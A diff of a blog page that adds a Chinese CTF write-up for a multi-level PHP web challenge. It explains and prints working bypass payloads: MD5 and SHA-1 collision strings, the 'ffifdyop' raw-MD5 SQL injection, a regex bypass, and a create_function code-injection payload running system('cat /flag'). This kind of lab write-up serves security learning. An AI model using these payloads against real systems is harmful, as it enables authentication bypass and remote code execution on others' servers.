@@ -193,7 +193,7 @@
   const ipt = document.querySelector('#search-input')
   const btn = document.querySelector('#search-btn')
   const layer = document.querySelector('#search-layer')
-  const posts = JSON.parse(`[{"title":"level-up","path":"2025/07/07/level-up/"}]`)
+  const posts = JSON.parse(`[{"title":"level-up","path":"2025/07/07/level-up/"},{"title":"pop","path":"2025/07/07/pop/"}]`)
   ipt.addEventListener('keyup', e => {
     if (e.key === 'Enter') {
       handleSearch()
@@ -264,7 +264,7 @@
         </a>
         <a href="/tags">
           <div>
-            <span>0</span>
+            <span>1</span>
             <span>标签</span>
           </div>
         </a>
@@ -327,7 +327,7 @@
       </h5>
       <p class="main-left--subtitle">
         <span>文章数目：</span>
-        <span>1 篇</span>
+        <span>2 篇</span>
       </p>
       <p class="main-left--subtitle">
         <span>最近动态：</span>
@@ -364,7 +364,7 @@
           
           <div class="article-info--tags">
             <span>标签：</span>
-            
+            <a class="tag-link" href="/tags/level-up/" rel="tag">level-up</a>
           </div>
           
           <p class="article-info--date">日期：2025-07-07 19:50:21</p>
@@ -373,7 +373,132 @@
       </div>
     </div>
     <article class="article-content markdown-body">
-      
+      <p>打开题目发现啥都没有嘞，那就想到要扫一下目录</p>
+<p><img src="D:\boke\Hexo-Blog\source_posts\level-up.assets\image-20250523212933635-174816191635615.png"></p>
+<p>发现robots.txt文件，访问一下发现源码的php文件</p>
+<p><img src="D:\boke\Hexo-Blog\source_posts\level-up.assets\image-20250523213112928-17480070746541-174816193289716.png" alt="image-20250523213112928-17480070746541"></p>
+<p>源码level2</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://node5.anna.nssctf.cn:27960/level_2_1s_h3re.php</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//here is level 2</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;str.php&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;array1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;array2&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$a1</span> = (<span class="keyword">string</span>)<span class="variable">$_POST</span>[<span class="string">&#x27;array1&#x27;</span>];</span><br><span class="line">    <span class="variable">$a2</span> = (<span class="keyword">string</span>)<span class="variable">$_POST</span>[<span class="string">&#x27;array2&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$a1</span> == <span class="variable">$a2</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;????&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">md5</span>(<span class="variable">$a1</span>) === <span class="title function_ invoke__">md5</span>(<span class="variable">$a2</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$level3</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;level 2 failed ...&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>
+
+<p>发现是md5强碰撞</p>
+<hr>
+<hr>
+<hr>
+<p>那我们去学习一下md5的强弱碰撞吧</p>
+<h5 id="md5强弱碰撞-sha1碰撞"><a href="#md5强弱碰撞-sha1碰撞" class="headerlink" title="md5强弱碰撞+sha1碰撞"></a>md5强弱碰撞+sha1碰撞</h5><p>强比较：使用三个 ‘’&#x3D;&#x3D;&#x3D;’’ 比较，比较值，也比较类型</p>
+<p>弱比较：使用两个 ‘’&#x3D;&#x3D;’’ 比较，只比较值，不比较类型</p>
+<ul>
+<li>a&#x3D;&#x3D;b  将a，b的值转换成同类型再比较值</li>
+<li>a&#x3D;&#x3D;&#x3D;b 先判断a，b类型，若相同，则比较值，若不相同，则返回false</li>
+</ul>
+<h6 id="md5弱比较"><a href="#md5弱比较" class="headerlink" title="md5弱比较"></a>md5弱比较</h6><p>1.字符型和字符型比较，为同类型，比较其内容，例’’abc’’&#x3D;&#x3D;’’c’’ &#x3D;&gt; false</p>
+<p>字符串的弱比较只能采用0e绕过，需要注意的是，0e后面不能有字母的存在</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">（&quot;0e123456&quot;==&quot;0e345&quot;） =&gt; true</span><br><span class="line"></span><br><span class="line">（&quot;0e12adfc&quot;==&quot;0e345&quot;） =&gt; false</span><br></pre></td></tr></table></figure>
+
+<p>2.数字型和数字型比较，同上，例：123 &#x3D;&#x3D; 12 &#x3D;&gt; false   123&#x3D;&#x3D;123&#x3D;&gt;true</p>
+<p>3.字符型和数字型比较</p>
+<p> 先看<strong>字符串开头</strong>是否为<strong>数字</strong></p>
+<p>​          如果为数字，则截止到<strong>连续</strong>数字的最后一个数字，即<code>&quot;123abc456&quot;</code>&#x3D;&gt;<code>123</code></p>
+<p>​          如果不为数字，则判断为false，即<code>&quot;abc123456&quot;</code>&#x3D;&gt;<code>0</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">(&quot;123abc&quot;==123) =&gt; true</span><br><span class="line">(&quot;123&quot;==123) =&gt; true</span><br><span class="line">(&quot;123abc&quot;==&quot;123&quot;) =&gt; false</span><br><span class="line">(&quot;abc123&quot;==0) =&gt; true</span><br></pre></td></tr></table></figure>
+
+<p>&#x3D;&#x3D;绕过方法&#x3D;&#x3D;</p>
+<p>&lt;1&gt;0e绕过</p>
+<p>原理：计算器表达10的幂一般是用E或e</p>
+<p>如：<strong>2 760 000  &#x3D;  2.76×10^6  &#x3D;   2.76e6</strong></p>
+<p>​      所以0e，无论后面跟什么值，都是0</p>
+<p>以下是常见的字符串md5值为0e开头</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">加密后的密文                      原值</span><br><span class="line"></span><br><span class="line">QNKCDZO           0E830400451993494058024219903391</span><br><span class="line">240610708           0E462097431906509019562988736854</span><br><span class="line">s878926199a       0E545993274517709034328855841020</span><br><span class="line">s155964671a       0E342768416822451524974117254469</span><br><span class="line">s214587387a       0E848240448830537924465865611904</span><br></pre></td></tr></table></figure>
+
+<p>&lt; 2&gt; 数组绕过</p>
+<p>md5不能加密数组 ，如 a[]&#x3D;1 , b[]&#x3D;1 , 传入数组会报错,但会继续执行并且返回结果为null</p>
+<p>比如传入md5(a[]&#x3D;1)md5(b[]&#x3D;2)，实际上是nullnull，所以数组进行md5弱比较时，结果相等</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$a</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"><span class="variable">$b</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>];</span><br><span class="line"><span class="title function_ invoke__">md5</span>(<span class="variable">$a</span>)==<span class="title function_ invoke__">md5</span>(<span class="variable">$b</span>)</span><br></pre></td></tr></table></figure>
+
+<p>payload:?a[]&#x3D;1&amp;b[]&#x3D;2</p>
+<h6 id="md5强类型绕过"><a href="#md5强类型绕过" class="headerlink" title="md5强类型绕过"></a>md5强类型绕过</h6><p><strong>&lt;1&gt;md5值完全相同的字符绕过</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$a</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"><span class="variable">$b</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>];</span><br><span class="line"><span class="title function_ invoke__">md5</span>(<span class="variable">$a</span>)===<span class="title function_ invoke__">md5</span>(<span class="variable">$b</span>)</span><br></pre></td></tr></table></figure>
+
+<p>payload：?a&#x3D;%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2&#x3D;&#x3D;&amp;b&#x3D;&#x3D;&#x3D;%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2</p>
+<ul>
+<li><strong>两个MD5值完全相同的字符</strong></li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">array1=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2</span><br><span class="line"></span><br><span class="line">array2=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2</span><br><span class="line"></span><br><span class="line">array1=%af%13%76%70%82%a0%a6%58%cb%3e%23%38%c4%c6%db%8b%60%2c%bb%90%68%a0%2d%e9%47%aa%78%49%6e%0a%c0%c0%31%d3%fb%cb%82%25%92%0d%cf%61%67%64%e8%cd%7d%47%ba%0e%5d%1b%9c%1c%5c%cd%07%2d%f7%a8%2d%1d%bc%5e%2c%06%46%3a%0f%2d%4b%e9%20%1d%29%66%a4%e1%8b%7d%0c%f5%ef%97%b6%ee%48%dd%0e%09%aa%e5%4d%6a%5d%6d%75%77%72%cf%47%16%a2%06%72%71%c9%a1%8f%00%f6%9d%ee%54%27%71%be%c8%c3%8f%93%e3%52%73%73%53%a0%5f%69%ef%c3%3b%ea%ee%70%71%ae%2a%21%c8%44%d7%22%87%9f%be%79%6d%c4%61%a4%08%57%02%82%2a%ef%36%95%da%ee%13%bc%fb%7e%a3%59%45%ef%25%67%3c%e0%27%69%2b%95%77%b8%cd%dc%4f%de%73%24%e8%ab%66%74%d2%8c%68%06%80%0c%dd%74%ae%31%05%d1%15%7d%c4%5e%bc%0b%0f%21%23%a4%96%7c%17%12%d1%2b%b3%10%b7%37%60%68%d7%cb%35%5a%54%97%08%0d%54%78%49%d0%93%c3%b3%fd%1f%0b%35%11%9d%96%1d%ba%64%e0%86%ad%ef%52%98%2d%84%12%77%bb%ab%e8%64%da%a3%65%55%5d%d5%76%55%57%46%6c%89%c9%df%b2%3c%85%97%1e%f6%38%66%c9%17%22%e7%ea%c9%f5%d2%e0%14%d8%35%4f%0a%5c%34%d3%73%a5%98%f7%66%72%aa%43%e3%bd%a2%cd%62%fd%69%1d%34%30%57%52%ab%41%b1%91%65%f2%30%7f%cf%c6%a1%8c%fb%dc%c4%8f%61%a5%93%40%1a%13%d1%09%c5%e0%f7%87%5f%48%e7%d7%b3%62%04%a7%c4%cb%fd%f4%ff%cf%3b%74%28%1c%96%8e%09%73%3a%9b%a6%2f%ed%b7%99%d5%b9%05%39%95%ab&amp;array2=%af%13%76%70%82%a0%a6%58%cb%3e%23%38%c4%c6%db%8b%60%2c%bb%90%68%a0%2d%e9%47%aa%78%49%6e%0a%c0%c0%31%d3%fb%cb%82%25%92%0d%cf%61%67%64%e8%cd%7d%47%ba%0e%5d%1b%9c%1c%5c%cd%07%2d%f7%a8%2d%1d%bc%5e%2c%06%46%3a%0f%2d%4b%e9%20%1d%29%66%a4%e1%8b%7d%0c%f5%ef%97%b6%ee%48%dd%0e%09%aa%e5%4d%6a%5d%6d%75%77%72%cf%47%16%a2%06%72%71%c9%a1%8f%00%f6%9d%ee%54%27%71%be%c8%c3%8f%93%e3%52%73%73%53%a0%5f%69%ef%c3%3b%ea%ee%70%71%ae%2a%21%c8%44%d7%22%87%9f%be%79%6d%c4%61%a4%08%57%02%82%2a%ef%36%95%da%ee%13%bc%fb%7e%a3%59%45%ef%25%67%3c%e0%27%69%2b%95%77%b8%cd%dc%4f%de%73%24%e8%ab%66%74%d2%8c%68%06%80%0c%dd%74%ae%31%05%d1%15%7d%c4%5e%bc%0b%0f%21%23%a4%96%7c%17%12%d1%2b%b3%10%b7%37%60%68%d7%cb%35%5a%54%97%08%0d%54%78%49%d0%93%c3%b3%fd%1f%0b%35%11%9d%96%1d%ba%64%e0%86%ad%ef%52%98%2d%84%12%77%bb%ab%e8%64%da%a3%65%55%5d%d5%76%55%57%46%6c%89%c9%5f%b2%3c%85%97%1e%f6%38%66%c9%17%22%e7%ea%c9%f5%d2%e0%14%d8%35%4f%0a%5c%34%d3%f3%a5%98%f7%66%72%aa%43%e3%bd%a2%cd%62%fd%e9%1d%34%30%57%52%ab%41%b1%91%65%f2%30%7f%cf%c6%a1%8c%fb%dc%c4%8f%61%a5%13%40%1a%13%d1%09%c5%e0%f7%87%5f%48%e7%d7%b3%62%04%a7%c4%cb%fd%f4%ff%cf%3b%74%a8%1b%96%8e%09%73%3a%9b%a6%2f%ed%b7%99%d5%39%05%39%95%ab</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><p><strong>此时插入sha1值完全相同的字符</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">array1=%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C/Width%202%200%20R/Height%203%200%20R/Type%204%200%20R/Subtype%205%200%20R/Filter%206%200%20R/ColorSpace%207%200%20R/Length%208%200%20R/BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85/%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01%7FF%DC%93%A6%B6%7E%01%3B%02%9A%AA%1D%B2V%0BE%CAg%D6%88%C7%F8K%8CLy%1F%E0%2B%3D%F6%14%F8m%B1i%09%01%C5kE%C1S%0A%FE%DF%B7%608%E9rr/%E7%ADr%8F%0EI%04%E0F%C20W%0F%E9%D4%13%98%AB%E1.%F5%BC%94%2B%E35B%A4%80-%98%B5%D7%0F%2A3.%C3%7F%AC5%14%E7M%DC%0F%2C%C1%A8t%CD%0Cx0Z%21Vda0%97%89%60k%D0%BF%3F%98%CD%A8%04F%29%A1</span><br><span class="line"></span><br><span class="line">array2=%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C/Width%202%200%20R/Height%203%200%20R/Type%204%200%20R/Subtype%205%200%20R/Filter%206%200%20R/ColorSpace%207%200%20R/Length%208%200%20R/BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85/%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01sF%DC%91f%B6%7E%11%8F%02%9A%B6%21%B2V%0F%F9%CAg%CC%A8%C7%F8%5B%A8Ly%03%0C%2B%3D%E2%18%F8m%B3%A9%09%01%D5%DFE%C1O%26%FE%DF%B3%DC8%E9j%C2/%E7%BDr%8F%0EE%BC%E0F%D2%3CW%0F%EB%14%13%98%BBU.%F5%A0%A8%2B%E31%FE%A4%807%B8%B5%D7%1F%0E3.%DF%93%AC5%00%EBM%DC%0D%EC%C1%A8dy%0Cx%2Cv%21V%60%DD0%97%91%D0k%D0%AF%3F%98%CD%A4%BCF%29%B1</span><br></pre></td></tr></table></figure></li>
+</ul>
+<p><strong>&lt;2&gt;数组绕过</strong></p>
+<p>payload：?a[]&#x3D;1&amp;b[]&#x3D;2</p>
+<h6 id="万能通式ffifdyop-绕过"><a href="#万能通式ffifdyop-绕过" class="headerlink" title="万能通式ffifdyop 绕过"></a>万能通式ffifdyop 绕过</h6><p>   &#x3D;&#x3D;**万能通式：**129581926211651571912466741651878684928和ffifdyop&#x3D;&#x3D;</p>
+<p>实例：</p>
+<p>select * from ‘admin’ where password&#x3D;md5($pass,true)</p>
+<p>输入md5(‘ffifdyop’,true)绕过</p>
+<p>即</p>
+<p>select * from ‘admin’ where password&#x3D;md5 ( ‘ ffifdyop ‘ ,true)<br>md5(string,raw)</p>
+<p><img src="D:\boke\Hexo-Blog\source_posts\level-up.assets\7058fe431c37d69d0b7ac16230b168e3-174816197570817.png" alt="7058fe431c37d69d0b7ac16230b168e3"></p>
+<p>绕过原理：</p>
+<p><img src="D:\Study\typora笔记\ctf.web.wp\img\e2e5c70eac06c97212d385dc12839117-174816198775418-174816198941819.png" alt="e2e5c70eac06c97212d385dc12839117"></p>
+<p>接着做题ffifdyop 这个字符串被 md5 哈希了后会变成 276f722736c95d99e921722cf9ed621c，这个字符串前几位刚好是’ or ‘6<br>而 Mysql 刚好又会把 hex 转成 ascii 解释，因此拼接之后的形式是 select * from ‘admin’ where password&#x3D; ‘  ‘ or ‘6xxxxx ‘，等价于 or 一个永真式，因此相当于万能密码，可以绕过md5()函数。</p>
+<p>where password&#x3D;正确的密码or 1 ，代表永真，那么前面有没有密码都无所谓了简单说，</p>
+<p>select * from admin where password&#x3D; ‘   ‘ or’6&lt;乱码&gt;’</p>
+<p>就相当于</p>
+<p>select * from admin where password&#x3D; ‘   ‘   or 1 实现sql注入</p>
+<p>当两个条件中有任一个条件满足，“逻辑或”的运算结果就为“真”</p>
+<hr>
+<hr>
+<hr>
+<p>level 2 md5强碰撞</p>
+<p>从上面的知识点中找两个符合标准的值直接post传参，发现可能是因为参数太复杂，直接在网页上post传参不行，那就bp抓包传参，但是发现抓包是get传参，搜一下如何利用bppost传参</p>
+<p><img src="D:\boke\Hexo-Blog\source_posts\level-up.assets\f4b6d40d64ba71465d393c90fc8b9806-174816200517020.png" alt="f4b6d40d64ba71465d393c90fc8b9806"></p>
+<p>先将get改为post，然后再加上</p>
+<p>Content-Type: application&#x2F;x-www-form-urlencoded，再在下面加入我们像传参的内容即可</p>
+<p>思考为啥不能用数组绕过而只能通过在找到两个md5值完全相同的字符串达到绕过的目的</p>
+<p>审计代码发现，这个传入参数之后会进行一个类型的强制转换，不管你最初传入的数据是什么类型的，都会被传入的时候强转成字符串类型的，而两个数组被转换成字符串之后为Array，在第一个绕过就会被砍掉</p>
+<p>那为啥能用md5值相同的字符串绕过，在post传参时没有被%00截断</p>
+<p>原因：1PHP接收并URL解码 → 完整二进制数据</p>
+<ol start="2">
+<li>(string)转换 → 保持二进制字符串不变</li>
+</ol>
+<p><img src="D:\boke\Hexo-Blog\source_posts\level-up.assets\image-20250524110508779-17480559101352-174816202851721.png" alt="image-20250524110508779-17480559101352"></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"> <span class="comment">//here is level 3 </span></span><br><span class="line"> <span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>); </span><br><span class="line"> <span class="keyword">include</span> <span class="string">&quot;str.php&quot;</span>;</span><br><span class="line"> <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;array1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;array2&#x27;</span>]))&#123;   <span class="variable">$a1</span> = (<span class="keyword">string</span>)<span class="variable">$_POST</span>[<span class="string">&#x27;array1&#x27;</span>];  </span><br><span class="line"><span class="variable">$a2</span> = (<span class="keyword">string</span>)<span class="variable">$_POSTarray2</span><span class="string">&#x27;];   </span></span><br><span class="line"><span class="string">if ($a1 == $a2)&#123;     die(&quot;????&quot;);   &#125;   </span></span><br><span class="line"><span class="string">if (sha1($a1) === sha1($a2))&#123;     </span></span><br><span class="line"><span class="string">echo $level4; </span></span><br><span class="line"><span class="string">&#125;else&#123;     </span></span><br><span class="line"><span class="string">die(&quot;level 3 failed ...&quot;);   </span></span><br><span class="line"><span class="string">   &#125; </span></span><br><span class="line"><span class="string">&#125; </span></span><br><span class="line"><span class="string">else&#123;   </span></span><br><span class="line"><span class="string">show_source(__FILE__); </span></span><br><span class="line"><span class="string">&#125; ?&gt; </span></span><br></pre></td></tr></table></figure>
+
+<p>审计代码发现是sha1的强碰撞</p>
+<p><img src="D:\boke\Hexo-Blog\source_posts\level-up.assets\image-20250524112910214-17480573514913-174816204342022.png" alt="image-20250524112910214-17480573514913"></p>
+<p>level4</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//here is last level</span></span><br><span class="line">    <span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">include</span> <span class="string">&quot;str.php&quot;</span>;</span><br><span class="line">    <span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$str</span> = <span class="title function_ invoke__">parse_url</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_URI&#x27;</span>]);</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$str</span>[<span class="string">&#x27;query&#x27;</span>] == <span class="string">&quot;&quot;</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;give me a parameter&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/ |_|20|5f|2e|\./&#x27;</span>,<span class="variable">$str</span>[<span class="string">&#x27;query&#x27;</span>]))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;blacklist here&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;NI_SA_&#x27;</span>] === <span class="string">&quot;txw4ever&quot;</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="variable">$level5</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;level 4 failed ...&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">give me a parameterlevel <span class="number">4</span> failed ...</span><br></pre></td></tr></table></figure>
+
+<p>正则绕过</p>
+<p>掉了空格、下划线、<code>.</code>，即，我们的url中不能包含这三个。但是题目需要GET传入的参数又有下划线，这时可以用<code>+ [</code>来替换掉下划线，但是我试了用<code>[</code>不行，所以这里我们用加号</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://node5.anna.nssctf.cn:26272/level_level_4.php?NI+SA+=txw4ever</span><br></pre></td></tr></table></figure>
+
+<p>得到55_5_55.php</p>
+<p>第五关</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//sorry , here is true last level</span></span><br><span class="line"><span class="comment">//^_^</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;str.php&quot;</span>;</span><br><span class="line"><span class="variable">$a</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"><span class="variable">$b</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^[a-z0-9_]*$/isD&#x27;</span>,<span class="variable">$a</span>))&#123;</span><br><span class="line">    <span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$a</span>(<span class="string">&#x27;&#x27;</span>,<span class="variable">$b</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>对于传入的参数a，过滤掉非字母、数字、下划线，不分字母大小写</p>
+<p>审计代码会知道</p>
+<p>可以利用 $a(‘’, $b) 执行代码：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$a 可以是 create_function（动态创建函数）。</span><br><span class="line">$b 注入恶意代码（如 system(&#x27;cat /flag&#x27;)）</span><br></pre></td></tr></table></figure>
+
+<p>需要绕过正则，因为匹配正则没啥用</p>
+<p>反斜杠 \：破坏正则匹配（如 \create_function）。</p>
+<p>PHP 的 create_function 会动态创建一个匿名函数，内部实现本质是：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__lambda_func</span>(<span class="params"><span class="variable">$args</span></span>) </span>&#123;</span><br><span class="line">  [用户输入的代码]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>当代码执行 $a(‘’, $b) 时，实际生成：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\<span class="title function_ invoke__">create_function</span>(<span class="string">&#x27;&#x27;</span>, <span class="string">&quot;&#125;system(&#x27;cat /flag&#x27;);//&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+<p>最终生成的函数相当于：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__lambda_func</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  &#125;<span class="title function_ invoke__">system</span>(<span class="string">&#x27;cat /flag&#x27;</span>);<span class="comment">//</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>通过闭合原函数的花括号并添加注释符，实现了代码注入。</p>
+<p>最终的payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/55_5_55.php?a=\create_function&amp;b=&#125;system(&#x27;cat /flag&#x27;);//</span><br></pre></td></tr></table></figure>
+
     </article>
     
     <div class="read-nums">
@@ -394,8 +519,18 @@
     <div class="article-catelogue--wrapper">
       <div class="catelogue catelogue-1">
         <h3>目录</h3>
-        
